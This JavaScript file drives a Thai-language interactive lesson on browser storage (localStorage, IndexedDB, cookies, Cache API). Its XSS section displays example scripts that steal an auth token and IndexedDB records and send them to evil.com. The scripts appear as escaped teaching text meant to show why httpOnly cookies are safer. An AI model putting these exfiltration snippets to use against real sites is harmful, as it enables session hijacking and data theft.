// ── BROWSER STORAGE ──
function storSwitchView(btn, viewId) {
  document.querySelectorAll('#storage-tab .stor-view').forEach(v => v.classList.add('stor-hidden'));
  document.querySelectorAll('#storage-tab .stor-nav-btn').forEach(b => b.classList.remove('stor-nav-active'));
  const view = document.getElementById(viewId);
  if (view) view.classList.remove('stor-hidden');
  if (btn) btn.classList.add('stor-nav-active');
  storInitHljs();
}

// Overview: Lifetime animation
function storLifetimeAnim(action) {
  const ids = ['local','session','idb','cookie','cache'];
  if (action === 'close-tab') {
    const s = document.getElementById('stor-bar-session');
    if (s) { s.classList.add('stor-bar-dead'); s.querySelector('.stor-bar-label').textContent = 'หาย'; }
    const c = document.getElementById('stor-bar-cookie');
    if (c) { c.querySelector('.stor-bar-fill').style.width = '55%'; c.querySelector('.stor-bar-label').textContent = 'ลดลงตาม TTL'; }
  } else if (action === 'clear') {
    ids.forEach(id => {
      const el = document.getElementById('stor-bar-' + id);
      if (el) { el.classList.add('stor-bar-dead'); el.querySelector('.stor-bar-label').textContent = 'หาย'; }
    });
  } else {
    ids.forEach(id => {
      const el = document.getElementById('stor-bar-' + id);
      if (!el) return;
      el.classList.remove('stor-bar-dead');
      const fill = el.querySelector('.stor-bar-fill');
      if (fill) fill.style.width = '100%';
    });
    const labels = { local:'ถาวร', session:'อยู่ใน tab นี้', idb:'ถาวร', cookie:'จนหมด TTL', cache:'ถาวร' };
    Object.entries(labels).forEach(([id, txt]) => {
      const el = document.getElementById('stor-bar-' + id);
      if (el) el.querySelector('.stor-bar-label').textContent = txt;
    });
  }
}

// localStorage Playground
function storLocalStore() {
  const k = document.getElementById('stor-play-key').value.trim();
  const v = document.getElementById('stor-play-val').value.trim();
  if (!k) { showToast('ใส่ key ด้วย'); return; }
  try {
    localStorage.setItem('_sp_' + k, v);
    storLocalRefresh();
    showToast('บันทึกแล้ว ✓');
  } catch(e) { showToast('Error: ' + e.message); }
}
function storLocalGet() {
  const k = document.getElementById('stor-play-key').value.trim();
  if (!k) { showToast('ใส่ key ด้วย'); return; }
  const v = localStorage.getItem('_sp_' + k);
  const out = document.getElementById('stor-play-out');
  out.textContent = v === null ? 'null — ไม่พบ key นี้' : '"' + v + '"';
  out.className = 'stor-play-out ' + (v === null ? 'stor-play-null' : 'stor-play-found');
}
function storLocalDelete() {
  const k = document.getElementById('stor-play-key').value.trim();
  if (!k) { showToast('ใส่ key ด้วย'); return; }
  localStorage.removeItem('_sp_' + k);
  storLocalRefresh();
  showToast('ลบแล้ว');
}
function storLocalClearAll() {
  Object.keys(localStorage).filter(k => k.startsWith('_sp_')).forEach(k => localStorage.removeItem(k));
  storLocalRefresh();
  showToast('ล้างทั้งหมดแล้ว');
}
function storLocalRefresh() {
  const list = document.getElementById('stor-play-list');
  if (!list) return;
  const keys = Object.keys(localStorage).filter(k => k.startsWith('_sp_'));
  if (!keys.length) { list.innerHTML = '<div class="stor-play-empty">ว่าง — ยังไม่มีข้อมูล</div>'; return; }
  list.innerHTML = keys.map(k => {
    const dk = k.replace('_sp_', ''); const v = localStorage.getItem(k);
    return `<div class="stor-play-item"><span class="stor-play-k">${escHtml(dk)}</span><span class="stor-play-arr">→</span><span class="stor-play-v">"${escHtml(v)}"</span><button class="stor-play-del" data-key="${escHtml(k)}" onclick="storLocalDelItem(this)">✕</button></div>`;
  }).join('');
}
function storLocalDelItem(btn) {
  const k = btn.dataset.key;
  if (k) { localStorage.removeItem(k); storLocalRefresh(); }
}

// IndexedDB visual table
let _storIdbData = [
  { id:1, name:'สมชาย ใจดี',   role:'admin', ts:'2026-06-01' },
  { id:2, name:'มาลี สวยงาม',  role:'user',  ts:'2026-06-10' },
  { id:3, name:'วิชัย เก่งมาก',role:'user',  ts:'2026-06-15' },
];
let _storIdbNext = 4;
function storIdbRender(highlight) {
  const tb = document.getElementById('stor-idb-tbody');
  if (!tb) return;
  tb.innerHTML = _storIdbData.map(r => `<tr class="stor-idb-row${highlight===r.id?' stor-idb-hl':''}" id="stor-idb-r${r.id}">
    <td class="stor-idb-id">${r.id}</td><td>${escHtml(r.name)}</td>
    <td><span class="stor-idb-role stor-idb-role-${r.role}">${r.role}</span></td>
    <td class="stor-idb-ts">${r.ts}</td>
    <td><button class="stor-idb-del" onclick="storIdbDelete(${r.id})">🗑️</button></td>
  </tr>`).join('');
}
function _storIdbReapplySearch() {
  const el = document.querySelector('#stor-idb .stor-idb-search');
  if (el && el.value) storIdbSearch(el.value);
}
function storIdbAdd() {
  const names=['พิมพ์ใจ รักดี','ชัยวัฒน์ มั่นคง','นภา สดใส','อนุชา ขยัน','กมลา ใฝ่รู้','ธนา พอดี'];
  const roles=['user','user','user','admin'];
  const row={id:_storIdbNext++,name:names[Math.floor(Math.random()*names.length)],role:roles[Math.floor(Math.random()*roles.length)],ts:new Date().toISOString().split('T')[0]};
  _storIdbData.push(row);
  storIdbRender(row.id);
  _storIdbReapplySearch();
  const tr=document.getElementById('stor-idb-r'+row.id);
  if(tr)tr.scrollIntoView({behavior:'smooth',block:'nearest'});
}
function storIdbDelete(id) {
  const tr=document.getElementById('stor-idb-r'+id);
  if(tr){tr.classList.add('stor-idb-del-anim');setTimeout(()=>{_storIdbData=_storIdbData.filter(r=>r.id!==id);storIdbRender();_storIdbReapplySearch();},300);}
}
function storIdbSearch(term) {
  term=term.toLowerCase();
  document.querySelectorAll('#stor-idb-tbody .stor-idb-row').forEach(tr=>{
    tr.classList.toggle('stor-idb-dim',term.length>0&&!tr.textContent.toLowerCase().includes(term));
  });
}

// Cookie animation
let _storCkRunning = false;
function storCookieAnimate() {
  if (_storCkRunning) return;
  _storCkRunning = true;
  const btn    = document.getElementById('stor-ck-btn');
  const status = document.getElementById('stor-ck-status');
  const pReq   = document.getElementById('stor-ck-prog-req');
  const pRes   = document.getElementById('stor-ck-prog-res');
  const pktReq = document.getElementById('stor-ck-pkt-req');
  const pktRes = document.getElementById('stor-ck-pkt-res');
  const lblRes = document.getElementById('stor-ck-lbl-res');
  if (!btn) return;

  // reset
  if(pReq){ pReq.style.transition='none'; pReq.style.width='0%'; }
  if(pRes){ pRes.style.transition='none'; pRes.style.transform='scaleX(0)'; }
  [pktReq, pktRes].forEach(el => { if(el){el.classList.remove('stor-ck-pkt-show');} });
  if(lblRes) lblRes.classList.remove('stor-ck-lbl-show');
  btn.disabled = true; btn.textContent = '⏳ running…';

  // Step 1: request travels → server
  setTimeout(() => {
    if(status) status.textContent = '📤 Browser ส่ง GET /api/profile + Cookie header…';
    if(pktReq) pktReq.classList.add('stor-ck-pkt-show');
    if(pReq)  { pReq.style.transition='width 1.2s linear'; pReq.style.width='100%'; }
  }, 100);

  // Step 2: server receives, processes
  setTimeout(() => {
    if(pktReq) pktReq.classList.remove('stor-ck-pkt-show');
    if(status) status.textContent = '⚙️ Server อ่าน Cookie → ระบุตัวตน user ✓';
  }, 1400);

  // Step 3: response travels ← browser
  setTimeout(() => {
    if(status) status.textContent = '📥 Server ส่ง 200 OK + Set-Cookie: session=xyz; HttpOnly; Secure';
    if(pktRes) pktRes.classList.add('stor-ck-pkt-show');
    if(lblRes) lblRes.classList.add('stor-ck-lbl-show');
    if(pRes)  { pRes.style.transition='transform 1.2s linear'; pRes.style.transform='scaleX(1)'; }
  }, 1800);

  // Done
  setTimeout(() => {
    if(status) status.textContent = '✅ Cookie ถูกส่งอัตโนมัติ — browser จัดการให้ทั้งหมด JS ไม่ต้องทำอะไรเลย';
    if(pktRes) pktRes.classList.remove('stor-ck-pkt-show');
    btn.disabled = false; btn.textContent = '▶ Animate อีกครั้ง';
    _storCkRunning = false;
  }, 3200);
}

// Cache API log animation
let _storCacheFilled=false;
function storCacheAnim(type) {
  const log=document.getElementById('stor-cache-log');
  if(!log)return;
  const t=()=>new Date().toLocaleTimeString('th-TH');
  const steps={
    'first':[
      `<span class="stor-cl-time">${t()}</span> 🌐 Browser → GET /app.js`,
      `<span class="stor-cl-time">${t()}</span> ⚙️ Service Worker รับ request`,
      `<span class="stor-cl-time">${t()}</span> 🔍 เช็ค Cache… <span class="stor-cl-miss">MISS</span>`,
      `<span class="stor-cl-time">${t()}</span> 📡 ดึงจาก Network (148ms)`,
      `<span class="stor-cl-time">${t()}</span> 💾 บันทึกลง Cache`,
      `<span class="stor-cl-time">${t()}</span> ✅ ส่ง Response → Browser`,
    ],
    'hit':[
      `<span class="stor-cl-time">${t()}</span> 🌐 Browser → GET /app.js`,
      `<span class="stor-cl-time">${t()}</span> ⚙️ Service Worker รับ request`,
      `<span class="stor-cl-time">${t()}</span> 🔍 เช็ค Cache… <span class="stor-cl-hit">HIT ⚡</span>`,
      `<span class="stor-cl-time">${t()}</span> ✅ ส่ง Cache Response ทันที (2ms)`,
    ],
    'offline':[
      `<span class="stor-cl-time">${t()}</span> 📴 ไม่มีอินเทอร์เน็ต!`,
      `<span class="stor-cl-time">${t()}</span> 🌐 Browser → GET /app.js`,
      `<span class="stor-cl-time">${t()}</span> ⚙️ Service Worker รับ request`,
      `<span class="stor-cl-time">${t()}</span> 🔍 เช็ค Cache… <span class="stor-cl-hit">HIT ✅</span>`,
      `<span class="stor-cl-time">${t()}</span> 🎉 App ใช้งานได้แบบ Offline!`,
    ],
  };
  if(type==='hit'&&!_storCacheFilled){showToast('กด "Request ครั้งแรก" ก่อน');return;}
  if(type==='first')_storCacheFilled=true;
  log.innerHTML='';
  (steps[type]||[]).forEach((html,i)=>{
    const div=document.createElement('div');
    div.className='stor-cl-line';
    div.style.animationDelay=(i*0.18)+'s';
    div.innerHTML=html;
    log.appendChild(div);
  });
}

// Security: XSS visualization
const _storXssData={
  ls:{ code:`// XSS injected script:\nlocalStorage.getItem('auth_token')\n// → "eyJhbGciOiJIUzI1NiJ9..." 😱\n\n// ส่งออก:\nfetch('https://evil.com/steal?t='+localStorage.getItem('auth_token'))`, cls:'stor-xss-danger', msg:'❌ อันตราย — JS อ่าน localStorage ได้ทั้งหมด XSS ขโมย token ได้ทันที' },
  ss:{ code:`// XSS injected script:\nsessionStorage.getItem('auth_token')\n// → "eyJhbGciOiJIUzI1NiJ9..." 😱`, cls:'stor-xss-danger', msg:'❌ อันตราย — sessionStorage เหมือน localStorage เลย JS อ่านได้ปกติ' },
  hc:{ code:`// XSS injected script:\ndocument.cookie\n// → "" (ว่างเปล่า! httpOnly cookie มองไม่เห็น)\n\n// JS ไม่สามารถอ่าน httpOnly cookie ได้เลย ✅`, cls:'stor-xss-safe', msg:'✅ ปลอดภัย — httpOnly cookie ถูกซ่อนจาก JavaScript ทั้งหมด XSS ขโมยไม่ได้' },
  idb:{ code:`// XSS อ่าน IndexedDB ได้:\nindexedDB.open('myapp').onsuccess = e => {\n  const db = e.target.result;\n  const store = db.transaction('profiles')\n    .objectStore('profiles');\n  store.getAll().onsuccess = e => {\n    // ส่งข้อมูลออก...\n    fetch('https://evil.com', {\n      method: 'POST',\n      body: JSON.stringify(e.target.result)\n    });\n  };\n};`, cls:'stor-xss-warning', msg:'⚠️ เสี่ยง — XSS อ่าน IndexedDB ได้ อย่าเก็บ token หรือ sensitive data ใน IndexedDB' },
};
let _storXssCur='ls';
function storXssSelect(id) {
  _storXssCur=id;
  document.querySelectorAll('.stor-xss-tab').forEach(b=>b.classList.remove('stor-xss-tab-active'));
  const btn=document.querySelector(`.stor-xss-tab[data-id="${id}"]`);
  if(btn)btn.classList.add('stor-xss-tab-active');
  storXssRender();
}
function storXssRender() {
  const d=_storXssData[_storXssCur];
  const box=document.getElementById('stor-xss-box');
  if(!box||!d)return;
  box.className='stor-xss-box '+d.cls;
  box.innerHTML=`<pre class="stor-xss-code">${escHtml(d.code)}</pre><div class="stor-xss-msg">${d.msg}</div>`;
}

// Decision Tree
const _storDt={
  start:{ q:'ต้องการเก็บข้อมูลประเภทไหน?', opts:[
    {l:'🔑 Auth token / session ID', n:'token'},
    {l:'⚙️ Settings / Preferences ขนาดเล็ก', n:'settings'},
    {l:'📦 ข้อมูลแอป (profile, draft, history)', n:'appdata'},
    {l:'🌐 HTTP Response / Static Assets', n:'cache'},
  ]},
  token:{ answer:{ type:'httpOnly Cookie', color:'#34d399', why:'httpOnly cookie ปลอดภัยที่สุด — JS อ่านไม่ได้ XSS ขโมยไม่ได้ server set ผ่าน Set-Cookie header ส่งไปกับ request อัตโนมัติ' }},
  settings:{ answer:{ type:'localStorage', color:'#60a5fa', why:'localStorage เหมาะกับ preferences เล็กๆ เช่น theme, language, sidebar state — ใช้ง่าย synchronous แต่จำกัด 5–10 MB และเก็บได้แค่ string' }},
  appdata:{ q:'ขนาดข้อมูลใหญ่กว่า 5 MB ไหม?', opts:[
    {l:'ใช่ (ใหญ่กว่า 5 MB)', n:'bigdata'},
    {l:'ไม่ (เล็กกว่า 5 MB)', n:'smalldata'},
  ]},
  bigdata:{ answer:{ type:'IndexedDB', color:'#a78bfa', why:'IndexedDB รองรับข้อมูลขนาด GB ค้นหาด้วย index ได้ เก็บ Object/Blob ได้ทุกประเภท แนะนำใช้ผ่าน Dexie.js เพื่อ API ที่ง่ายขึ้น' }},
  smalldata:{ q:'ข้อมูลต้องอยู่หลังปิด tab ไหม?', opts:[
    {l:'ใช่ ต้องอยู่ตลอด', n:'persist'},
    {l:'ไม่ หายได้ตอนปิด tab', n:'session'},
  ]},
  persist:{ answer:{ type:'localStorage หรือ IndexedDB', color:'#60a5fa', why:'ถ้าเป็น key-value ธรรมดา → localStorage ถ้าต้องการค้นหา หรือเก็บหลาย records → IndexedDB' }},
  session:{ answer:{ type:'sessionStorage', color:'#fb923c', why:'sessionStorage เหมาะกับ multi-step form, wizard, checkout flow — ข้อมูลหายเมื่อปิด tab ซึ่งเป็นข้อดีสำหรับข้อมูลชั่วคราว' }},
  cache:{ answer:{ type:'Cache API (Service Worker)', color:'#34d399', why:'Cache API เหมาะกับ PWA offline — เก็บ HTTP response HTML/CSS/JS/รูป ทำให้แอปทำงานได้แม้ไม่มีเน็ต dev-tools นี้ก็ใช้ Cache API อยู่!' }},
};
let _storDtStack=[];
function storDtInit() { _storDtStack=[]; storDtRender('start'); }
function storDtPick(next) { _storDtStack.push(next); storDtRender(next); }
function storDtBack() { _storDtStack.pop(); storDtRender(_storDtStack.length?_storDtStack[_storDtStack.length-1]:'start'); }
function storDtRender(key) {
  const step=_storDt[key]; const box=document.getElementById('stor-dt-box');
  if(!step||!box)return;
  if(step.answer){
    box.innerHTML=`<div class="stor-dt-answer" style="border-color:${step.answer.color}">
      <div class="stor-dt-ans-type" style="color:${step.answer.color}">✅ ใช้ <strong>${step.answer.type}</strong></div>
      <div class="stor-dt-ans-why">${step.answer.why}</div>
      <div class="stor-dt-ans-actions">
        ${_storDtStack.length>1?'<button class="stor-dt-back" onclick="storDtBack()">← ย้อนกลับ</button>':''}
        <button class="stor-dt-restart" onclick="storDtInit()">🔄 เริ่มใหม่</button>
      </div>
    </div>`;
  } else {
    box.innerHTML=`<div class="stor-dt-q">${step.q}</div>
      <div class="stor-dt-opts">${step.opts.map(o=>`<button class="stor-dt-opt" onclick="storDtPick('${o.n}')">${o.l}</button>`).join('')}</div>
      ${_storDtStack.length>0?'<button class="stor-dt-back" onclick="storDtBack()">← ย้อนกลับ</button>':''}`;
  }
}
function storCopyCode(btn) {
  const pre=btn.nextElementSibling; if(!pre)return;
  copyText(pre.textContent||pre.innerText);
  const orig=btn.textContent; btn.textContent='✓ copied';
  setTimeout(()=>{btn.textContent=orig;},1800);
}
function storInitHljs() {
  if(!window.hljs)return;
  document.querySelectorAll('#storage-tab pre.stor-code').forEach(pre=>{
    if(pre.dataset.hlInit)return;
    pre.dataset.hlInit='1';
    const code=document.createElement('code');
    code.className='language-javascript';
    code.textContent=pre.textContent.replace(/^\n/,'');
    pre.textContent='';
    pre.appendChild(code);
    window.hljs.highlightElement(code);
  });
}
